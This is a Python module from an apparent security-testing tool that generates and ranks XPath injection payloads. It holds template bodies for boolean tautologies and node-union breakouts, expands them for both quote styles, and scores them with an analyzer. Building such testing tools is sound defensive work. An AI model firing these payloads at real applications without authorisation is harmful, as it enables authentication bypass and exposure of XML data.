"""XPath injection payload mutation engine."""

from __future__ import annotations

from dataclasses import dataclass, field

from ..models import Context, Risk
from .context import analyze_xpath_context

# Injection bodies for a string context (after closing the quote).
_STRING_BODIES = [
    ("{q} or {q}1{q}={q}1", "boolean-true"),
    ("{q} or 1=1 or {q}{q}={q}", "boolean-true"),
    ("{q} and {q}1{q}={q}2", "boolean-false"),
    ("{q}] | //* | //x[{q}", "node-union"),
]

# Injection bodies for a numeric or expression position.
_EXPR_BODIES = [
    ("1 or 1=1", "boolean-true"),
    ("1 and 1=1", "boolean-true"),
    ("1] | //* | //x[1", "node-union"),
]

_RISK_ORDER = {
    Risk.CRITICAL: 4,
    Risk.HIGH: 3,
    Risk.MEDIUM: 2,
    Risk.LOW: 1,
    Risk.NONE: 0,
}


@dataclass
class XPathCandidate:
    payload: str
    risk: Risk
    command_injected: bool
    syntax_valid: bool
    strategy: str


@dataclass
class XPathMutationResult:
    template: str
    context: Context
    generated: int
    valid: int
    candidates: list[XPathCandidate] = field(default_factory=list)

    @property
    def high_probability(self) -> list[str]:
        return [c.payload for c in self.candidates[:10]]

    def to_dict(self) -> dict:
        return {
            "template": self.template,
            "context": self.context.value,
            "generated": self.generated,
            "valid": self.valid,
            "high_probability": self.high_probability,
            "candidates": [
                {
                    "payload": c.payload,
                    "risk": c.risk.value,
                    "command_injected": c.command_injected,
                    "syntax_valid": c.syntax_valid,
                    "strategy": c.strategy,
                }
                for c in self.candidates
            ],
        }


def _generate(context: Context) -> list[tuple[str, str]]:
    seen: set[str] = set()
    out: list[tuple[str, str]] = []

    def add(payload: str, strategy: str) -> None:
        if payload not in seen:
            seen.add(payload)
            out.append((payload, strategy))

    if context == Context.XPATH_STRING:
        for quote in ("'", '"'):
            for body, strategy in _STRING_BODIES:
                add(body.format(q=quote), strategy)
    else:
        for body, strategy in _EXPR_BODIES:
            add(body, strategy)

    return out


def mutate_xpath(template: str) -> XPathMutationResult:
    """Generate and rank XPath injection payloads for ``template``."""
    from .analyzer import analyze_xpath

    context = analyze_xpath_context(template)
    generated = _generate(context)

    candidates: list[XPathCandidate] = []
    for payload, strategy in generated:
        result = analyze_xpath(template, payload)
        if result.breakout.command_injected:
            candidates.append(
                XPathCandidate(
                    payload=payload,
                    risk=result.risk,
                    command_injected=True,
                    syntax_valid=result.balance.syntax_valid,
                    strategy=strategy,
                )
            )

    candidates.sort(
        key=lambda c: (_RISK_ORDER[c.risk], c.syntax_valid, -len(c.payload)),
        reverse=True,
    )

    return XPathMutationResult(
        template=template,
        context=context,
        generated=len(generated),
        valid=len(candidates),
        candidates=candidates,
    )
